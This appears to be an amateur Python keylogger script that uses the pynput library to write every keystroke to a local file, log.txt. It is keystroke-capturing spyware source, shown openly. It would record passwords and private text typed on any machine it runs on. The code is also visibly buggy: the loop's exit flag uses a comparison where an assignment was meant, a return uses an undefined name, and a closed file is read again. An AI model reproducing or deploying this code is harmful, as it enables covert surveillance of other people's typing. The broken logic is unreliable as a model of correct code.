
#!/usr/bin/env python3


# from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
a = 1
while a == 1:
# log_dir = ""
	log = open("log.txt","a+")

	# for i in range(10):
	#      log.write("This is line %d\r\n" % (i+1))

	log.write("\n*******************\n")

	# def on_press(key):
	# 	logging.info(str(key))
	# 	if key == Key.esc:
	# 		return false

	# with Listener(on_press=on_press) as listener:
	# 	listener.join()



	def on_press(key):
		
		# print('Key {} pressed.'.format(key))
		thekey = str(key)
		log.write(thekey)

	def on_release(key):
		# print('Key {} released.'.format(key))
		if str(key) == 'Key.esc':
			print('Exiting...')
			
			
			log.write("release")
			
			# contents=log.read()
			# print(contents)
			# log.close()

			log.close()

			# log = open("log.txt","a+")
			# for i in range(10):
			# 	log.write("********")
			# log.close()
			a == 2
			return false



	with keyboard.Listener(
		on_press = on_press,
		on_release = on_release) as listener:
		listener.join()

log = open("log.txt","r+")
contents=log.read()
print(contents)
# log.close()
log2 = open("boobs.txt","a+")
contents=log.read()
print(contents)

log2.close()
log.close()
	# logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(messages):')
